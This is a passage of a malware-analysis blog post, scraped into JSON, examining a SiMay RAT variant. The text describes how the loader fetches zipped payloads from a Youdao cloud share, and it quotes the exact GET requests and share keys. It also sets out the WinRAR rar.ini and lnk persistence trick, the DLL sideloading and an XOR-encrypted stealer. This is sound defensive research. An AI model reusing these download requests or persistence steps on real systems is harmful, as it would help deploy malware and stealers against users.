@@ -1,0 +1,675 @@
+{
+    "id": "<report_0xe698d91e>",
+    "url": "https://labs.k7computing.com/index.php/sneaky-simay",
+    "title": "Sneaky SiMay",
+    "meta": [
+        {
+            "id": "<chapter_0x308bcff>",
+            "title": "Sneaky SiMay",
+            "title_level": 1,
+            "sentences": [
+                {
+                    "id": "<sentence_0x67c1466c>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "By Andrew SheltonMay 31, 2022",
+                    "html": "\nBy Andrew SheltonMay 31, 2022\n \n"
+                },
+                {
+                    "id": "<sentence_0xb3d8c761>",
+                    "is_empty": true,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "",
+                    "html": "<p></p>"
+                },
+                {
+                    "id": "<sentence_0xec62fd89>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Hackers have been abusing cloud services to host their malicious payloads and then use a downloader/loader to deploy them in the victims machine. Recently we came across a Remote Access Trojan (RAT) sample doing an activity on similar lines. This has been shared in VirusTotal. This sample was later identified as a variant of SiMay RAT. At the time of writing this blog, the sample under consideration had a low AV detection rate in VT, which further increased our curiosity to dive deeper into this. Not only that, there were also a few more samples of the SiMay RAT variant that were uploaded in VT with different hashes.",
+                    "html": "<p>Hackers have been abusing cloud services to host their malicious payloads and then use a downloader/loader to deploy them in the victim\u2019s machine. Recently we came across a Remote Access Trojan (RAT) sample doing an activity on similar lines. This has been shared in VirusTotal. This sample was later identified as a variant of SiMay RAT. At the time of writing this blog, the sample under consideration had a low AV detection rate in VT, which further increased our curiosity to dive deeper into this. Not only that, there were also a few more samples of the SiMay RAT variant that were uploaded in VT with different hashes.</p>"
+                },
+                {
+                    "id": "<sentence_0x22bade0b>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "While analysing the main sample, we identified it as a Multistage downloader/loader, which downloads the payload as a zip file (from the cloud service that is subscribed to by the attacker) and executes one of the legit executable with a malicious dll file (which are inside the zip) in memory using DLL sideloading method.",
+                    "html": "<p>While analysing the main sample, we identified it as a Multistage downloader/loader, which downloads the payload as a zip file (from the cloud service that is subscribed to by the attacker) and executes one of the legit executable with a malicious dll file (which are inside the zip) in memory using DLL sideloading method.</p>"
+                },
+                {
+                    "id": "<sentence_0xa665b8c4>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "In this blog we will discuss how the SiMay RAT is downloaded as a payload from the cloud, deployed in the machine, its persistence and how it goes about loading the malicious DLL.",
+                    "html": "<p>In this blog we will discuss how the SiMay RAT is downloaded as a payload from the cloud, deployed in the machine, its persistence and how it goes about loading the malicious DLL.</p>"
+                },
+                {
+                    "id": "<sentence_0x7ae0e938>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<img_0x41fa9814>": "https://labs.k7computing.com/wp-content/uploads/2022/05/Figure1-3.png"
+                    },
+                    "text": "Figure 1: Workflow of SiMay RAT",
+                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_24059\"><img alt=\"\" class=\"size-full wp-image-24059\" height=\"875\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/05/Figure1-3.png\" width=\"1131\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-24059\">Figure 1: Workflow of SiMay RAT</figcaption></figure>"
+                }
+            ]
+        }
+    ],
+    "chapters": [
+        {
+            "id": "<chapter_0xb63b378c>",
+            "title": "Sneaky SiMay",
+            "title_level": 1,
+            "sentences": [
+                {
+                    "id": "<sentence_0x3adedf7f>",
+                    "is_empty": true,
+                    "have_tags": true,
+                    "tags": {
+                        "<img_0xdde7706>": "https://labs.k7computing.com/wp-content/uploads/2022/05/SiMay-RAT.png"
+                    },
+                    "text": "",
+                    "html": "<img alt=\"\" class=\"hidden-social-img\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/05/SiMay-RAT.png\"/>"
+                },
+                {
+                    "id": "<sentence_0xcb7ccfd1>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0xb5323700>": "https://labs.k7computing.com/index.php/category/uncategorized/"
+                    },
+                    "text": "Uncategorized",
+                    "html": "<a class=\"uncategorized\" href=\"https://labs.k7computing.com/index.php/category/uncategorized/\">Uncategorized</a>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0xa854be1d>",
+            "title": "Analysing the Binary",
+            "title_level": 3,
+            "sentences": [
+                {
+                    "id": "<sentence_0xa07dd120>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "On analysing the sample, we noticed that the main loader has a Windows File Explorer icon , which can be deceiving to a user who can unknowingly execute the same.",
+                    "html": "<p>On analysing the sample, we noticed that the main loader has a Windows File Explorer icon , which can be deceiving to a user who can unknowingly execute the same.</p>"
+                },
+                {
+                    "id": "<sentence_0x4d1e8109>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "The executable was a VC8 compiled binary. The TimeDateStamp indicates it was compiled on 10th of April 2022. There were multiple URLs hard coded in the binary as shown in Figure 2. We will be getting into the deets of these URLs later in this blog during the payload download process.",
+                    "html": "<p>The executable was a VC8 compiled binary. The TimeDateStamp indicates it was compiled on 10th of April 2022. There were multiple URLs hard coded in the binary as shown in Figure 2. We will be getting into the deets of these URLs later in this blog during the payload download process.</p>"
+                },
+                {
+                    "id": "<sentence_0x648c2179>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<img_0xb88b82c8>": "https://labs.k7computing.com/wp-content/uploads/2022/05/Figure2-3.png"
+                    },
+                    "text": "Figure 2: Hardcoded URLs in Binary",
+                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_24060\"><img alt=\"\" class=\"size-full wp-image-24060\" height=\"97\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/05/Figure2-3.png\" width=\"986\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-24060\">Figure 2: Hardcoded URLs in Binary</figcaption></figure>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0x384c9ad3>",
+            "title": "Behavioural Analysis",
+            "title_level": 3,
+            "sentences": [
+                {
+                    "id": "<sentence_0x9f0c26a>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "The malware first tries to decrypt two executables that are already present in the data section. Code block for the same is shown in Figure 3",
+                    "html": "<p>The malware first tries to decrypt two executables that are already present in the data section. Code block for the same is shown in Figure 3</p>"
+                },
+                {
+                    "id": "<sentence_0x6bf71702>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<img_0xfd9a1aa8>": "https://labs.k7computing.com/wp-content/uploads/2022/05/Figure3-3.png"
+                    },
+                    "text": "Figure 3: Decryption Loop for .NET Loaders",
+                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_24061\"><img alt=\"\" class=\"size-full wp-image-24061\" height=\"513\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/05/Figure3-3.png\" width=\"690\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-24061\">Figure 3: Decryption Loop for .NET Loaders</figcaption></figure>"
+                },
+                {
+                    "id": "<sentence_0xf7a17b9d>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<img_0x1f253a1c>": "https://labs.k7computing.com/wp-content/uploads/2022/05/Figure4-3.png"
+                    },
+                    "text": "Figure 4: Decrypted .NET Binary",
+                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_24062\"><img alt=\"\" class=\"size-full wp-image-24062\" height=\"249\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/05/Figure4-3.png\" width=\"868\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-24062\">Figure 4: Decrypted .NET Binary</figcaption></figure>"
+                },
+                {
+                    "id": "<sentence_0xbdf0d0b6>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "The decrypted executables are .NET compiled binaries. While debugging we found that the first executable to be named as Cshape-CppHostingBridageAuto and is used for performing multiple operations like invoking a process, writing a binary from the memory and helping with resolving web request for the loader, and the second executable is named as CShapeHosting and is responsible for downloading the payload.",
+                    "html": "<p>The decrypted executables are .NET compiled binaries. While debugging we found that the first executable to be named as Cshape-CppHostingBridageAuto and is used for performing multiple operations like invoking a process, writing a binary from the memory and helping with resolving web request for the loader, and the second executable is named as CShapeHosting and is responsible for downloading the payload.</p>"
+                },
+                {
+                    "id": "<sentence_0x5b67b5bb>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<img_0xf7f532a2>": "https://labs.k7computing.com/wp-content/uploads/2022/05/Figure5-3.png"
+                    },
+                    "text": "Figure 5: Downloader Function in CShapeHosting executable",
+                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_24063\"><img alt=\"\" class=\"size-full wp-image-24063\" height=\"274\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/05/Figure5-3.png\" width=\"911\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-24063\">Figure 5: Downloader Function in CShapeHosting executable</figcaption></figure>"
+                },
+                {
+                    "id": "<sentence_0x6ceb7007>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "The CShapeHosting will get the arguments from the Main Loader and tries to contact the ip 59.111.183[.]194 which is corresponding to the domain note.youdao.com (A Chinese cloud service provider) using GET request as:",
+                    "html": "<ul>\n<li>The CShapeHosting will get the arguments from the Main Loader and tries to contact the ip 59.111.183[.]194 which is corresponding to the domain note.youdao.com (A Chinese cloud service provider) using GET request as:</li>\n</ul>"
+                },
+                {
+                    "id": "<sentence_0x933f5564>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "GET /yws/api/personal/share?method=get&shareKey=cfae45c9e7cc8a7734b72abe98235dd1 HTTP/1.0",
+                    "html": "<p>GET /yws/api/personal/share?method=get&amp;shareKey=cfae45c9e7cc8a7734b72abe98235dd1 HTTP/1.0</p>"
+                },
+                {
+                    "id": "<sentence_0x94c5e810>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Host: note.youdao[.]com",
+                    "html": "<p>Host: note.youdao[.]com</p>"
+                },
+                {
+                    "id": "<sentence_0xa32dcb73>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "To which the server responds with a JSON with interesting strings :",
+                    "html": "<p>To which the server responds with a JSON with interesting strings :</p>"
+                },
+                {
+                    "id": "<sentence_0x7456ece3>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "id:WEB842633ba1786c31f2996429d59ceca79,userId:quanshiyu2022@163.com,name: GUDUO, shareTime:1639822384952 (2021-12-18)",
+                    "html": "<p>\u201cid\u201d:\u201dWEB842633ba1786c31f2996429d59ceca79\u2033,\u201duserId\u201d:\u201dquanshiyu2022@163.com\u201c,\u201dname\u201d: GUDUO, \u201cshareTime\u201d:1639822384952 (2021-12-18)</p>"
+                },
+                {
+                    "id": "<sentence_0x60a60488>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "We can see that a share has been activated way before the malware binary was compiled, showing that the malware actors had spent quite some time planning this campaign.",
+                    "html": "<p>We can see that a share has been activated way before the malware binary was compiled, showing that the malware actors had spent quite some time planning this campaign.</p>"
+                },
+                {
+                    "id": "<sentence_0xd06fb317>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "After parsing the JSON data, the malware creates another GET request as:",
+                    "html": "<ul>\n<li>After parsing the JSON data, the malware creates another GET request as:</li>\n</ul>"
+                },
+                {
+                    "id": "<sentence_0xb378f117>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "GET /yws/public/notebook/cfae45c9e7cc8a7734b72abe98235dd1/subdir/WEB842633ba1786c31f2996429d59ceca79 HTTP/1.0",
+                    "html": "<p>GET /yws/public/notebook/cfae45c9e7cc8a7734b72abe98235dd1/subdir/WEB842633ba1786c31f2996429d59ceca79 HTTP/1.0</p>"
+                },
+                {
+                    "id": "<sentence_0x5137be07>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "As we can see the subdir/WEB842633ba1786c31f2996429d59ceca79 is retrieved from the JSON data. Now the server replies with yet another JSON data which contains interesting information for the payloads that is stored in the attackers share that includes the necessary keys for accessing the file like a web path p:/<PATH_TO_FILE> and file name tl:<FILE_NAME>.zip",
+                    "html": "<p>As we can see the subdir/WEB842633ba1786c31f2996429d59ceca79 is retrieved from the JSON data. Now the server replies with yet another JSON data which contains interesting information for the payloads that is stored in the attacker\u2019s share that includes the necessary keys for accessing the file like a web path \u201cp\u201d:\u201d/&lt;PATH_TO_FILE&gt;\u201d and file name \u201ctl\u201d:\u201d&lt;FILE_NAME&gt;.zip\u201d</p>"
+                },
+                {
+                    "id": "<sentence_0xc4842b9a>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "For the sample under analysis, the share contains around 27 malicious payloads.",
+                    "html": "<p>For the sample under analysis, the share contains around 27 malicious payloads.</p>"
+                },
+                {
+                    "id": "<sentence_0x14c2650f>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "It now takes one of the zip file and tries to download it with another GET request as:",
+                    "html": "<ul>\n<li>It now takes one of the zip file and tries to download it with another GET request as:</li>\n</ul>"
+                },
+                {
+                    "id": "<sentence_0x53ecdcb8>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "GET /yws/api/personal/file/WEB4e6116b430403afd518512b82258a50d?method=download&shareKey=cfae45c9e7cc8a7734b72abe98235dd1 HTTP/1.0",
+                    "html": "<p>GET /yws/api/personal/file/WEB4e6116b430403afd518512b82258a50d?method=download&amp;shareKey=cfae45c9e7cc8a7734b72abe98235dd1 HTTP/1.0</p>"
+                },
+                {
+                    "id": "<sentence_0x3796aa6e>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Here id WEB4e6116b430403afd518512b82258a50d is retrieved from the previous JSON data, for which the server replies with the direct path to the malicious zip file (in our case it is o.zip) to be downloaded. The sample is then downloaded to the %USER%/Public/<root> folder.",
+                    "html": "<p>Here id WEB4e6116b430403afd518512b82258a50d is retrieved from the previous JSON data, for which the server replies with the direct path to the malicious zip file (in our case it is o.zip) to be downloaded. The sample is then downloaded to the \u201c%USER%/Public/&lt;root&gt;\u201d folder.</p>"
+                },
+                {
+                    "id": "<sentence_0x449ea706>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<img_0x793342a4>": "https://labs.k7computing.com/wp-content/uploads/2022/05/Figure6-4.png"
+                    },
+                    "text": "Figure 6: Multiple Payloads from YouDao Cloud Share seen in a Web Interface",
+                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_24064\"><img alt=\"\" class=\"size-full wp-image-24064\" height=\"577\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/05/Figure6-4.png\" width=\"1359\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-24064\">Figure 6: Multiple Payloads from YouDao Cloud Share seen in a Web Interface</figcaption></figure>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0x522f7da9>",
+            "title": "Analysing the Payload Archive",
+            "title_level": 3,
+            "sentences": [
+                {
+                    "id": "<sentence_0xf3fe7b3a>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "The contents of the zip file will look like this :",
+                    "html": "<p>The contents of the zip file will look like this :</p>"
+                },
+                {
+                    "id": "<sentence_0x74b1fe33>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<img_0x739268ff>": "https://labs.k7computing.com/wp-content/uploads/2022/05/Figure7-3.png"
+                    },
+                    "text": "Figure 7: Contents of Zip Archive",
+                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_24065\"><img alt=\"\" class=\"size-full wp-image-24065\" height=\"84\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/05/Figure7-3.png\" width=\"325\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-24065\">Figure 7: Contents of Zip Archive</figcaption></figure>"
+                },
+                {
+                    "id": "<sentence_0x919c1596>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "The main sample then extracts and writes the contents from the zip file to predefined locations as below:",
+                    "html": "<p>The main sample then extracts and writes the contents from the zip file to predefined locations as below:</p>"
+                },
+                {
+                    "id": "<sentence_0x1ee3071c>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Contents of the folder named package are copied to C:\\Users\\Public\\Documents\\efender\\<random_name>\\<files> which consist of the malicious DLL (GLUT32.dll), a legit executable exe (washost.exe) in which the DLL will be side-loaded later, and an XML file which will be used by the DLL later in the execution chain.",
+                    "html": "<p>Contents of the folder named \u201cpackage\u201d are copied to \u201cC:\\Users\\Public\\Documents\\efender\\&lt;random_name&gt;\\&lt;files&gt;\u201d which consist of the malicious DLL (GLUT32.dll), a legit executable exe (washost.exe) in which the DLL will be side-loaded later, and an XML file which will be used by the DLL later in the execution chain.</p>"
+                },
+                {
+                    "id": "<sentence_0xf649b391>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Contents of the folder named static are copied to C:\\ProgramData\\ as Windows-updatadfinder-CProgramData which will be used as a stealer and will be explained later in the blog.",
+                    "html": "<p>Contents of the folder named \u201cstatic\u201d are copied to \u201cC:\\ProgramData\\\u201d as Windows-updatadfinder-CProgramData which will be used as a stealer and will be explained later in the blog.</p>"
+                },
+                {
+                    "id": "<sentence_0xa3811cae>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Content of the folder name winzipper (fdaf1.fda1gfq) is copied to C:\\Users\\Public\\Downloads which is a command line version of WinRAR. This file is used for creating persistence for the payload.",
+                    "html": "<p>Content of the folder name \u201cwinzipper\u201d (fdaf1.fda1gfq) is copied to C:\\Users\\Public\\Downloads which is a command line version of WinRAR. This file is used for creating persistence for the payload.</p>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0x9b7b09f9>",
+            "title": "Creating Persistence",
+            "title_level": 3,
+            "sentences": [
+                {
+                    "id": "<sentence_0x87598c3f>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0x51f9a84e>": "https://research.checkpoint.com/2019/extracting-code-execution-from-winrar/"
+                    },
+                    "text": "After extracting the payloads, the malware uses the WinRAR vulnerability to create persistence where the WinRAR CLI payload comes into play. First, it creates a rar.ini file in the Public\\Downloads folder that has the string switches=-opC:\\Users\\<user_name>\\AppData\\Roaming y, as the WinRAR CLI can read the set of switches from the rar.ini. This switch describes the default location for the archive to be decompressed.",
+                    "html": "<p>After extracting the payloads, the malware uses the WinRAR <a href=\"https://research.checkpoint.com/2019/extracting-code-execution-from-winrar/\">vulnerability </a>to create persistence where the WinRAR CLI payload comes into play. First, it creates a rar.ini file in the Public\\Downloads folder that has the string \u201cswitches=-opC:\\Users\\&lt;user_name&gt;\\AppData\\Roaming \u2013y\u201d, as the WinRAR CLI can read the set of switches from the rar.ini. This switch describes the default location for the archive to be decompressed.</p>"
+                },
+                {
+                    "id": "<sentence_0xef5135b9>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Now the malware creates an lnk file in C:\\Users\\Public\\Downloads\\mobisample_start.lnk targeting the exe payload from C:\\Users\\Public\\Documents\\efender\\<random_name>\\<executable_name>.",
+                    "html": "<p>Now the malware creates an lnk file in \u201cC:\\Users\\Public\\Downloads\\mobisample_start.lnk\u201d targeting the exe payload from \u201cC:\\Users\\Public\\Documents\\efender\\&lt;random_name&gt;\\&lt;executable_name&gt;\u201d.</p>"
+                },
+                {
+                    "id": "<sentence_0xc2f82ba0>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<img_0x2006db7a>": "https://labs.k7computing.com/wp-content/uploads/2022/05/Figure8-3.png"
+                    },
+                    "text": "Figure 8: Function to Create LNK file",
+                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_24066\"><img alt=\"\" class=\"size-full wp-image-24066\" height=\"109\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/05/Figure8-3.png\" width=\"639\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-24066\">Figure 8: Function to Create LNK file</figcaption></figure>"
+                },
+                {
+                    "id": "<sentence_0xaa76a4e2>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "The created lnk file is then compressed to <random>.rar file in the same location by the WinRAR CLI tool with arguments as seen in Figure 9.",
+                    "html": "<p>The created lnk file is then compressed to &lt;random&gt;.rar file in the same location by the WinRAR CLI tool with arguments as seen in Figure 9.</p>"
+                },
+                {
+                    "id": "<sentence_0x7ed579f>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<img_0xc4f30244>": "https://labs.k7computing.com/wp-content/uploads/2022/05/Figure9-3.png"
+                    },
+                    "text": "Figure 9: Argument for WinRAR CLI tool",
+                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_24067\"><img alt=\"\" class=\"size-full wp-image-24067\" height=\"136\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/05/Figure9-3.png\" width=\"819\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-24067\">Figure 9: Argument for WinRAR CLI tool</figcaption></figure>"
+                },
+                {
+                    "id": "<sentence_0x7f524>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Another lnk file is then created by the malware with a random name in the path C:\\Users\\Public\\Music which has the target as :",
+                    "html": "<p>Another lnk file is then created by the malware with a random name in the path C:\\Users\\Public\\Music which has the target as :</p>"
+                },
+                {
+                    "id": "<sentence_0xa7ba75fa>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "C:\\Users\\Public\\Downloads\\<winrar_CLI>.exe x C:\\Users\\Public\\Downloads\\<random>.rar",
+                    "html": "<p> \u201cC:\\Users\\Public\\Downloads\\&lt;winrar_CLI&gt;.exe x C:\\Users\\Public\\Downloads\\&lt;random&gt;.rar\u201d</p>"
+                },
+                {
+                    "id": "<sentence_0x870f1a1e>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "where the argument x is used for extracting files with a full path. The malware then creates an instance of explorer.exe with the address as C:\\Users\\Public\\Music and runs in the background with the help of CppHostingBridageAuto as shown in the Figure below.",
+                    "html": "<p>where the argument \u201cx\u201d is used for extracting files with a full path. The malware then creates an instance of explorer.exe with the address as \u201cC:\\Users\\Public\\Music\u201d and runs in the background with the help of CppHostingBridageAuto as shown in the Figure below.</p>"
+                },
+                {
+                    "id": "<sentence_0x2881cc1b>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<img_0x60aa630f>": "https://labs.k7computing.com/wp-content/uploads/2022/05/Figure10-3.png"
+                    },
+                    "text": "Figure 10: Call to CppHostingBridageAuto from Loader",
+                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_24068\"><img alt=\"\" class=\"size-full wp-image-24068\" height=\"273\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/05/Figure10-3.png\" width=\"494\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-24068\">Figure 10: Call to CppHostingBridageAuto from Loader</figcaption></figure>"
+                },
+                {
+                    "id": "<sentence_0x11a986cd>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<img_0x4fe30548>": "https://labs.k7computing.com/wp-content/uploads/2022/05/Figure11-2.png"
+                    },
+                    "text": "Figure 11: Auto Function responsible for Invoking Explorer",
+                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_24069\"><img alt=\"\" class=\"size-full wp-image-24069\" height=\"308\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/05/Figure11-2.png\" width=\"872\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-24069\">Figure 11: Auto Function responsible for Invoking Explorer</figcaption></figure>"
+                },
+                {
+                    "id": "<sentence_0x8633dba7>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "The invoked explorer.exe is then used to start the lnk file that was created in Public\\Music folder which will now extract the archived lnk file mobisample_start.lnk to the %Appdata%\\Roaming\\ Microsoft\\Windows\\Start Menu\\Programs\\startup folder. There by achieving persistence.",
+                    "html": "<p>The invoked explorer.exe is then used to start the lnk file that was created in Public\\Music folder which will now extract the archived lnk file mobisample_start.lnk to the \u201c%Appdata%\\Roaming\\ Microsoft\\Windows\\Start Menu\\Programs\\startup\u201d folder. There by achieving persistence.</p>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0x3ec2bc73>",
+            "title": "Executing the Payload",
+            "title_level": 3,
+            "sentences": [
+                {
+                    "id": "<sentence_0xc978f362>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "After creating persistence, the malware renames the dropped file Windows-updatadfinder-CProgramData from ProgramData to Shell.txt which contains the shell code which will be used by the payload to perform the stealer activity.",
+                    "html": "<p>After creating persistence, the malware renames the dropped file \u201cWindows-updatadfinder-CProgramData\u201d from ProgramData to Shell.txt which contains the shell code which will be used by the payload to perform the \u201cstealer\u201d activity.</p>"
+                },
+                {
+                    "id": "<sentence_0x1a75e772>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "To execute the payload, the malware then creates a URL file in the path C:\\Users\\Public\\Music, which will be executed using the already invoked explorer process.",
+                    "html": "<p>To execute the payload, the malware then creates a URL file in the path \u201cC:\\Users\\Public\\Music\u201d, which will be executed using the already invoked explorer process.</p>"
+                },
+                {
+                    "id": "<sentence_0xa6984207>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<img_0xaa5e569d>": "https://labs.k7computing.com/wp-content/uploads/2022/05/Figure12-2.png"
+                    },
+                    "text": "Figure 12: Target of the URL file",
+                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_24070\"><img alt=\"\" class=\"size-full wp-image-24070\" height=\"64\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/05/Figure12-2.png\" width=\"474\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-24070\">Figure 12: Target of the URL file</figcaption></figure>"
+                },
+                {
+                    "id": "<sentence_0xa7bd526e>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0x3be2c776>": "https://www.proofpoint.com/us/threat-insight/post/Updated-Blackmoon-Banking-Trojan"
+                    },
+                    "text": "The payload <random>.exe then gets executed with the GLUT32.dll side-loaded, whereas the export functions of the DLL have the same name as available in the genuine version of the DLL. We also identified that the DLL has strings Blackmoon which corresponds to a Chinese compiler used in the 2014 KrBanker Trojan attack in South Korea.",
+                    "html": "<p>The payload &lt;random&gt;.exe then gets executed with the GLUT32.dll side-loaded, whereas the export functions of the DLL have the same name as available in the genuine version of the DLL. We also identified that the DLL has strings \u201cBlackmoon\u201d which corresponds to a Chinese compiler used in the <a href=\"https://www.proofpoint.com/us/threat-insight/post/Updated-Blackmoon-Banking-Trojan\">2014 KrBanker Trojan attack</a> in South Korea.</p>"
+                },
+                {
+                    "id": "<sentence_0x8ed46043>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<img_0x8b6db847>": "https://labs.k7computing.com/wp-content/uploads/2022/05/Figure13-2.png"
+                    },
+                    "text": "Figure 13: Malicious DLL sideloaded to legit executable",
+                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_24071\"><img alt=\"\" class=\"size-full wp-image-24071\" height=\"112\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/05/Figure13-2.png\" width=\"742\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-24071\">Figure 13: Malicious DLL sideloaded to legit executable</figcaption></figure>"
+                },
+                {
+                    "id": "<sentence_0xf335f56>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "We noticed that all the export functions in the sideloaded DLL do the same task by calling a same function which decrypts the xml file wc.xml and then uses the contents to create a new shell.ini file in C:\\programdata\\shell.ini. The shell.ini file contains the C2 servers IP address that the payload needs to contact.",
+                    "html": "<p>We noticed that all the export functions in the sideloaded DLL do the same task by calling a same function which decrypts the xml file \u201cwc.xml\u201d and then uses the contents to create a new shell.ini file in \u201cC:\\programdata\\shell.ini\u201d. The shell.ini file contains the C2 server\u2019s IP address that the payload needs to contact.</p>"
+                },
+                {
+                    "id": "<sentence_0xf5e7e7ed>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<img_0x5f9384ce>": "https://labs.k7computing.com/wp-content/uploads/2022/05/Figure14-1.png"
+                    },
+                    "text": "Figure 14: Contents of shell.ini file",
+                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_24072\"><img alt=\"\" class=\"size-full wp-image-24072\" height=\"213\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/05/Figure14-1.png\" width=\"301\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-24072\">Figure 14: Contents of shell.ini file</figcaption></figure>"
+                },
+                {
+                    "id": "<sentence_0x24b3a899>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "The shell.txt contains shell code to import modules and a PE file (encrypted) where each byte is XORed by 25h. Further, the decrypted PE file had the original DLL name as server.dll. It also had multiple strings related to different browser names and their paths for user data this dll acts as a stealer for the RAT.",
